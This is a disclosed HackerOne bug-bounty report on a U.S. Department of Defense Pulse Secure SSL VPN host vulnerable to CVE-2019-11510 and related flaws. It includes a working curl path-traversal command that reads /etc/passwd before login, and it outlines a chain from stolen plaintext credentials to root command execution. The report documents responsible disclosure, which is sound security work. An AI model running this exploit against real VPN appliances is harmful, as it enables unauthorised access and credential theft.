---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/file-and-directory-information-exposure
  - env/network
  - vuln/path-traversal
  - vuln/command-injection
  - vuln/code-injection
  - vuln/authentication-bypass
  - vuln/dos
  - impact/rce
  - trigger/unauthenticated
substate: "resolved"
weakness: "File and Directory Information Exposure"
enriched: true
body: true
date: 2021-07-29
submitted: 2019-09-14T22:51:23.490Z
bounty_usd: null
votes: 39
cve: "CVE-2019-11510", "CVE-2019-11542", "CVE-2019-11539", "CVE-2019-11538", "CVE-2019-11508", "CVE-2019-11540"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/695005"
title: "Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://████"
---
# Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 39 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-07-29

- Report: [https://hackerone.com/reports/695005](https://hackerone.com/reports/695005)
- CWE: File and Directory Information Exposure | CVE: CVE-2019-11510, CVE-2019-11542, CVE-2019-11539, CVE-2019-11538, CVE-2019-11508, CVE-2019-11540
- Submitted: 2019-09-14T22:51:23.490Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking

Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

I discovered that `https://██████████` instance is vulnerable to described vulnerabilities.

##POC

Reading `/etc/passwd` via CVE-2019-11510:
```
curl -i -k --path-as-is https://██████████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```
```
███████
█████████
██████████
████
█████
██████
███████
████████
███████
```

The RCE can be achieved with this chain:
1) Pulse Secure stores credentials in the cleartext.
2) Attacker reads credentials  and authorizes on VPN
3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.

##Suggested fix
Update the Pulse Secure SSL VPN software.

## Impact

Remote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.
You can see here example report to Twitter by Orange Tsai: https://hackerone.com/reports/591295

## Timeline

- **Report Filed**
- **2019-09-15** @sp1d3rs: Screenshot included:
█████

In case you will face with timeout errors (common thing when testing DoD resources), try to change your IP/VPN
- **2019-09-15** @h1_analyst_layla: Hi @sp1d3rs,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@bassguitar
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **Bounty Awarded**
- **2019-10-29** @sp1d3rs: As part of my monthly reports recheck process, it's notification that this report was resolved and instance patched.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
